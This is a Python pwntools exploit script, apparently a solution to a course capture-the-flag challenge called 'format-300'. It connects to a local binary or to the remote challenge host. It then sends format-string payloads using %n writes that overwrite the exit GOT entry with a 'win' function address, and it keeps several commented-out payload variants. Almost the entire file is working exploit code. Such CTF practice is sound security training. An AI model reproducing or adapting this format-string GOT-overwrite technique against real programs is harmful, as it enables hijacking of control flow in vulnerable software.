#!/usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):

    gs = '''
        init-pwndbg
        b *0x401213
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4830-format-300.chals.io", 443, ssl=True, sni="cse4830-format-300.chals.io")
    else:
        return process(binary)

def exploit(p,e,r):

    # Win 0x4011b9
    # Exit PLT  0x404040
    #               AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      CCCC    EEEE    GGGG    IIII    KKKK   
    format_test = b'%4198841d%8$n   ' + p64(e.got['exit']) 
    #format_test = b'%4198841d%8$n   ' + p64(0x403e18)
    #format_test = b'%4537d%13$n%61063d%14$n%33488832d%15$n%16$n             ' + p64(e.got['puts'])  +   p64(e.got['puts']+2)  +  p64(e.got['puts']+4) + p64(e.got['puts']+6)
    format_test = b'%4537d%13$n%61063d%14$n%33488832d%15$n%16$n             ' + p64(e.got['exit'])  +   p64(e.got['exit']+2)  +  p64(e.got['exit']+4) + p64(e.got['exit']+6)
    p.recvuntil(b'>>>')
    print(format_test)
    #format_write = b'%4198441d%7$n    ' + p64(e.got['puts']) 

    p.send(format_test)
    p.interactive()


if __name__=="__main__":
    file = './format-300'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
